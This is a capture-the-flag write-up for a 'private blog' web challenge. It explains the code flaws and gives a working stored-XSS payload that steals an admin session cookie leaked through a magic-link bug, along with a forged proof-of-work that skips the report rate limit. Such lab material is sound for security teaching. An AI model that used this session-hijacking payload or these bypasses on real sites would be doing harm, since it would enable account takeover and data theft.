# Personal Blog — Write-up (274 solves)

Challenge description: **“For your eyes only?”**

## What the challenge is trying to hide

The app is a “private blog” where *only you* can see your posts. The real secret is an **admin-only endpoint**:

- `GET /flag` returns the flag **only if you are logged in as admin**.

So the whole challenge is: **become “admin” (or act as admin) long enough to read `/flag`**.

---

## High-level idea (attack chain)

This is a classic “report to admin bot” challenge:

1. You can submit a URL to `/report`.
2. An **admin bot** (Puppeteer/Chromium) logs in as admin and visits your URL.
3. If you can make JavaScript run in the admin’s browser (XSS), you can steal/admin actions and get the flag.

This challenge gives you exactly enough bugs to do that:

- **Stored XSS** in the editor draft (autosave) path.
- **Cookies are not HttpOnly**, so XSS can read/overwrite session cookies.
- **Magic link sets `sid_prev`** when you already had a session, which lets us *grab the admin’s session id*.
- **Proof-of-work is forgeable**, so reporting is fast.

---

## Source code tour (important parts)

### 1) Admin-only flag

In `web/server.js`:

```js
app.get('/flag', requireLogin, (req, res) => {
  if (!req.user.isAdmin) return res.status(403).send('Admins only.');
  return res.send(FLAG);
});
```

### 2) Sessions stored in a cookie (`sid`) that JavaScript can access

Also in `web/server.js`:

```js
function cookieOptions() {
  return { httpOnly: false, sameSite: 'Lax', path: '/' };
}
```

`httpOnly: false` means **`document.cookie` can read and write the session cookie**.

### 3) The “draft” autosave endpoint does NOT sanitize HTML

There are two save routes:

- `/api/save` sanitizes (safe-ish)
- `/api/autosave` does **not** sanitize

```js
app.post('/api/autosave', requireLogin, (req, res) => {
  // ...
  const rawContent = String(req.body.content || '');
  post.draftContent = rawContent;   // <- UNSANITIZED
  saveDb(db);
  return res.json({ ok: true });
});
```

### 4) The editor renders `draftContent` with EJS *unescaped* (`<%- ... %>`)

In `web/views/editor.ejs`:

```ejs
<div id="editor" ... contenteditable="true"><%- draftContent %></div>
```

`<%- ... %>` means “render raw HTML”. So if `draftContent` contains `<script>...</script>`,
the browser will run it.

That gives us **stored XSS** (persistent JavaScript execution).

### 5) Magic link bug: leaking the previous session id into `sid_prev`

In `web/server.js`, when you use a magic link:

```js
const existingSid = req.cookies.sid;
if (existingSid) {
  res.cookie('sid_prev', existingSid, cookieOptions());
}
const sid = createSession(db, record.userId);
res.cookie('sid', sid, cookieOptions());
```

So if the admin is logged in (has a `sid`) and visits `/magic/<token>`, the server will:

- copy the admin `sid` into **`sid_prev`**
- replace `sid` with a session for whoever owns the magic link

Because cookies are readable, XSS can read `sid_prev` and steal the admin session id.

### 6) Admin bot behavior

In `bot/index.js`:

- It logs into the app as admin
- Then visits the reported URL (must be same origin as the app)

So `/report` is your way to get the admin to load your payload.

---

## Exploit plan (step by step)

Goal: make the admin bot execute JavaScript that temporarily switches to the admin session,
fetches `/flag`, then stores it somewhere we can read.

Why “store it” instead of sending it to our own server?

- The report system only allows **local URLs**, so exfiltration to an external domain is harder.
- Saving the flag into *our own private post* is a simple, reliable way to get it back.

### Step 0 — Create a normal user account

Register + login as any user.

### Step 1 — Create a new post and plant a stored XSS payload into its **draft**

1. Create a post (visit `/edit`, it redirects to `/edit/<id>`).
2. Send an autosave request to `/api/autosave` with content containing a `<script>` tag.

Why autosave?

- `/api/autosave` stores raw HTML into `draftContent` (no DOMPurify).
- The editor page prints `draftContent` *unescaped*, so the script runs.

### Step 2 — Generate a magic link for YOUR account

Visit `/account` and click “Generate link”, or POST to `/magic/generate`.

You’ll get a link like:

- `/magic/<32-hex-token>`

### Step 3 — Make the admin bot visit your magic link AND land on your editor page

Use the report feature to send the admin to:

```
/magic/<token>?redirect=/edit/<your_post_id>
```

This matters because:

1. When admin hits `/magic/<token>` while logged in:
   - `sid_prev = admin_sid`
   - `sid = your_user_sid`
2. Then it redirects to `/edit/<id>` and your stored XSS executes.

### Step 4 — In the XSS: steal `sid_prev`, fetch `/flag`, save it

When the admin bot reaches `/edit/<your_post_id>`, your JavaScript runs in their browser.

At that moment:

- `sid` is **your** session (because `/magic/<token>` just switched it)
- `sid_prev` is the **admin** session id (because `/magic/<token>` copied the previous cookie)

So your XSS can “borrow” the admin session by swapping the `sid` cookie, grabbing `/flag`,
then switching back.

### Step 5 — Submit the URL to the admin bot

Go to `/report` and submit:

```
/magic/<token>?redirect=/edit/<your_post_id>
```

Wait ~5–15 seconds for the bot to run.

### Step 6 — Read the flag from your post

Open:

```
/post/<your_post_id>
```

Your script saved the flag there using `/api/save`.

---

## Manual solve (no automation)

If you want to do this with just a browser + DevTools (or Burp):

### 1) Register and login

- Register at `/register`
- Login at `/login`

### 2) Create a post and get its id

- Visit `/edit`
- You will be redirected to `/edit/<id>` (that `<id>` is your post id)

### 3) Store the XSS in the draft via `/api/autosave`

Open DevTools → Console while logged in, and run:

```js
fetch('/api/autosave', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ postId: YOUR_POST_ID, content: '<script>alert(1)</script>' })
});
```

If you refresh `/edit/<id>`, you should see the alert (confirming stored XSS).

### 4) Generate a magic link token

- Go to `/account`
- Click “Generate link”
- Copy the `/magic/<token>` value shown

### 5) Submit the magic link to the admin bot

Submit this path to `/report`:

```
/magic/<token>?redirect=/edit/<your_post_id>
```

Note: the HTML form uses an `<input type="url">`, so it may reject a plain path in the UI.
If that happens, send the POST request manually (e.g., with Burp) or use the full URL.

### 6) PoW bypass (fast way)

On the report page HTML you’ll see a hidden input:

```html
<input type="hidden" name="pow_challenge" value="s.AAATiA==.SOME_RANDOM_X==" />
```

The server only checks the **difficulty** inside the challenge, not the random `x`.
So you can forge your own with `x = 0`:

- difficulty 5000 in base64 is `AAATiA==` (because `5000 == 0x00001388`)
- `x = 0` bytes base64 is `AA==`
- for even difficulty, `y = 0` also base64 `AA==`

Send:

- `pow_challenge = s.AAATiA==.AA==`
- `pow_solution = s.AA==`

Then submit the report.

### 7) Read your post

After the bot visits, open:

```
/post/<your_post_id>
```

and the flag should be saved there.

---

## The XSS payload (what it does)

When it runs in the admin’s browser on `/edit/<id>`, it:

1. Reads cookies:
   - `sid` = your session (after magic link swap)
   - `sid_prev` = admin session id (leaked by magic link)
2. Temporarily overwrites `sid` to the admin one.
3. `fetch('/flag')` (now authorized as admin).
4. Restores `sid` back to your session.
5. Saves the flag into your post using `/api/save` (so you can view it later).

Example payload (the one used by `solve.py`):

```html
<script>
(async () => {
  const cookieMap = Object.fromEntries(document.cookie.split('; ').filter(Boolean).map(p => {
    const idx = p.indexOf('=');
    return idx === -1 ? [p, ''] : [p.slice(0, idx), p.slice(idx + 1)];
  }));
  const mySid = cookieMap.sid || '';
  const adminSid = cookieMap.sid_prev || '';
  if (!mySid || !adminSid) return;

  document.cookie = 'sid=' + adminSid + '; path=/';
  const flag = await fetch('/flag', { credentials: 'include' }).then(r => r.text());
  document.cookie = 'sid=' + mySid + '; path=/';

  await fetch('/api/save', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ postId: YOUR_POST_ID, content: '<p>' + flag + '</p>' })
  });
})();
</script>
```

After the bot runs, just open `/post/<id>` in your account to read the flag.

---

## Proof-of-work (PoW) on `/report` and how we bypass it

The report page includes a PoW challenge. The server verifies it with:

- `powCheck(challenge, solution, expectedDifficulty)`

Important bug: **the server does not store challenges**.

It only checks:

1. `challenge.difficulty === expectedDifficulty`
2. some math on your `solution` results in `challenge.x` (or `MOD - x`)

That means *you can choose `x` yourself*.

### Easy bypass: forge a challenge with `x = 0`

If you set `x = 0`, you can pick a trivial `y` so that the check passes.

The transformation is (repeated `difficulty` times):

```
current = (current XOR 1)
current = current^2 mod p
```

For `y = 0`:

- after 1 step: `1`
- after 2 steps: `0`
- after 3 steps: `1`
- ...

So after an **even** number of steps, the result is `0`.

The challenge uses difficulty **5000** (even), so:

- forged challenge: difficulty=5000, x=0
- solution: y=0

`solve.py` does exactly this, so reporting is fast and doesn’t spend ~30s solving PoW.

---

## Full solve script (recommended)

Use the included script:

```bash
python3 solve.py
```

Optional: target a different URL:

```bash
BASE_URL='http://34.26.148.28:5000' python3 solve.py
```

What it automates:

1. Register + login
2. Create a post
3. Store the XSS via `/api/autosave`
4. Generate magic link
5. Submit `/report` (with PoW bypass)
6. Poll `/post/<id>` until the flag shows up

---

## Why this works (quick recap)

- `/api/autosave` stores unsanitized HTML → stored XSS.
- `editor.ejs` renders draft HTML unescaped → XSS executes.
- cookies are not HttpOnly → XSS can read/overwrite sessions.
- `/magic/<token>` copies the existing session into `sid_prev` → leaks admin `sid`.
- admin bot logs in then visits our URL → we get code execution in admin context.

---

## Flag

When solved against the provided instance, the script prints:

`uoftctf{533M5_l1k3_17_W4snt_50_p3r50n41...}`
